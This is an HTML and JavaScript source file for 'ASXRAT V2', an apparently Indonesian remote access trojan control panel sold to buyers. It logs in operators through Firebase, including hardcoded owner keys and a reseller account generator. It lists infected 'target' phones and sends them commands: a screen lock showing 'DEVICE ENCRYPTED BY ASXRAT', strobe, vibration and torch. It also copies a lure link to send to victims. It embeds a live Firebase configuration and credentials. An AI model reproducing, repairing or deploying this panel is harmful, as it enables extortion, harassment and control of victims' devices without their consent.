<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ASXRAT V2 | SUPREME CONTROL</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --red: #ff0000; --bg: #000; --card: #111; --gold: #ffd700; }
        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 0; }
        
        /* LOGIN BOX & BANNER */
        #auth-box { position: fixed; inset: 0; background: var(--bg); z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 15px; }
        .banner-img { 
            width: 100%; max-width: 420px; height: auto; min-height: 160px;
            object-fit: fill; border: 2px solid var(--red); border-bottom: none; 
            border-radius: 15px 15px 0 0; display: block; background: #000;
        }
        .login-card { 
            background: var(--card); padding: 25px; border: 2px solid var(--red); 
            border-radius: 0 0 15px 15px; width: 100%; max-width: 420px; 
            text-align: center; margin-top: -1px; box-sizing: border-box; 
        }
        
        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #333; color: var(--red); border-radius: 8px; text-align: center; outline: none; font-weight: bold; }
        .btn-main { background: var(--red); color: #fff; border: none; padding: 15px; font-weight: bold; border-radius: 8px; width: 100%; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
        
        /* DASHBOARD */
        #dash { display: none; padding: 15px; max-width: 500px; margin: auto; }
        .card { background: var(--card); border: 1px solid #222; padding: 15px; margin-bottom: 20px; border-radius: 12px; border-left: 5px solid var(--red); position: relative; }
        .btn-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 10px; }
        .btn-rat { background: #000; color: #fff; border: 1px solid var(--red); padding: 12px; font-size: 11px; border-radius: 6px; cursor: pointer; font-weight: bold; }
        .btn-panic { background: #ff0000; color: #fff; grid-column: span 2; border: 2px solid #fff; animation: blink 0.6s infinite; font-size: 13px; }
        @keyframes blink { 0% {opacity:1} 50% {opacity:0.4} 100% {opacity:1} }
        
        .boss-panel { border: 2px solid var(--gold); padding: 15px; border-radius: 12px; margin-bottom: 20px; display: none; background: #050505; }
        .copy-box { background: #fff; color: #000; padding: 15px; border-radius: 10px; font-weight: bold; text-align: center; margin-bottom: 20px; cursor: pointer; }
    </style>
</head>
<body>

    <div id="auth-box">
        <img src="https://gangalink.vercel.app/i/3mo453em.jpg" class="banner-img">
        <div class="login-card">
            <h3 style="color:red; margin:0 0 10px 0;">ASXRAT V2 LOGIN
            POWERED BY : ELVOXI
            CONNTACK TELEGRAM : @Elvoxi_Reals01</h3>
            <input type="text" id="log-mail" placeholder="EMAIL...">
            <input type="password" id="log-key" placeholder="SECRET KEY...">
            <button onclick="login()" class="btn-main">MASUK PANEL</button>
        </div>
    </div>

    <div id="dash">
        <div id="boss-panel" class="boss-panel">
            <b style="color:var(--gold); display:block; text-align:center; margin-bottom:10px;">👑 BOSS CREATE ROLE</b>
            <input type="text" id="new-mail" placeholder="Email Buyer...">
            <input type="text" id="new-key" placeholder="Key Buyer...">
            <select id="new-role"><option value="buyer">BUYER</option><option value="admin">ADMIN</option></select>
            <button onclick="createAccount()" class="btn-main" style="background:var(--gold); color:black;">GENERATE ACCESS</button>
        </div>

        <div class="copy-box" onclick="salinLink()">
            📋 SALIN LINK TARGET (AUTO-ID)
        </div>

        <div id="list"></div>
    </div>

<script>
    // PENTING: Ganti link di bawah ini dengan link target.html lo di GitHub!
    const linkWebTarget = "https://elvoxi.github.io/newcallingelvoxianjaikwkw/target.html";

    const firebaseConfig = {
      apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
      authDomain: "rat-html.firebaseapp.com",
      databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "rat-html",
      storageBucket: "rat-html.firebasestorage.app",
      messagingSenderId: "1060124583265",
      appId: "1:1060124583265:web:a117830e798cd1d60f5120"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    
    let currentKey = "";
    let myRole = "";

    function login() {
        const m = document.getElementById('log-mail').value, k = document.getElementById('log-key').value;
        if(k === "elvoxi122" || k === "mario122") {
            currentKey = k; myRole = "owner";
            document.getElementById('boss-panel').style.display = 'block';
            start();
        } else {
            db.ref('asxrat/accounts/' + k).once('value', s => {
                if(s.exists() && s.val().email === m) {
                    currentKey = k; myRole = s.val().role;
                    if(myRole === "admin") document.getElementById('boss-panel').style.display = 'block';
                    start();
                } else alert("DATA SALAH!");
            });
        }
    }

    function createAccount() {
        const m = document.getElementById('new-mail').value, k = document.getElementById('new-key').value, r = document.getElementById('new-role').value;
        db.ref('asxrat/accounts/' + k).set({ email: m, role: r }).then(() => alert("BERHASIL CREATE!"));
    }

    function start() {
        document.getElementById('auth-box').style.display = 'none';
        document.getElementById('dash').style.display = 'block';

        db.ref('mario/targets').on('value', snap => {
            const list = document.getElementById('list'); list.innerHTML = "";
            snap.forEach(child => {
                const d = child.val();
                if(myRole === "owner" || d.belongsTo === currentKey) {
                    list.innerHTML += `
                    <div class="card">
                        <b style="color:red">📱 ${d.model}</b> <small style="color:#444">(${d.belongsTo})</small>
                        <div class="btn-grid">
                            <button class="btn-rat btn-panic" onclick="sendL('${child.key}')">⚡ EXECUTE LOCK & STROBE</button>
                            <button class="btn-rat" onclick="cmd('${child.key}', 'unlock')">🔓 UNLOCK</button>
                            <button class="btn-rat" onclick="cmd('${child.key}', 'torch_on')">🔦 SENTER ON</button>
                            <button class="btn-rat" onclick="cmd('${child.key}', 'vibrate')">📳 GETAR</button>
                            <button class="btn-rat" onclick="db.ref('mario/targets/${child.key}').remove()">🗑️ HAPUS</button>
                        </div>
                    </div>`;
                }
            });
        });
    }

    function cmd(id, act) { db.ref('mario/commands/' + id).set({ action: act, time: Date.now() }); }
    
    function sendL(id) {
        db.ref('mario/commands/' + id).set({ 
            action: 'lock_screen', 
            text: "DEVICE ENCRYPTED BY ASXRAT", 
            pass: "123", 
            time: Date.now() 
        });
    }

    function salinLink() {
        // Ini fungsinya Mar, buat nempel Key akun ke link target (base64)
        const linkFix = linkWebTarget + "?id=" + btoa(currentKey);
        navigator.clipboard.writeText(linkFix);
        alert("LINK BERHASIL DISALIN!\nKirim ke target lo.");
    }
</script>
</body>
</html>
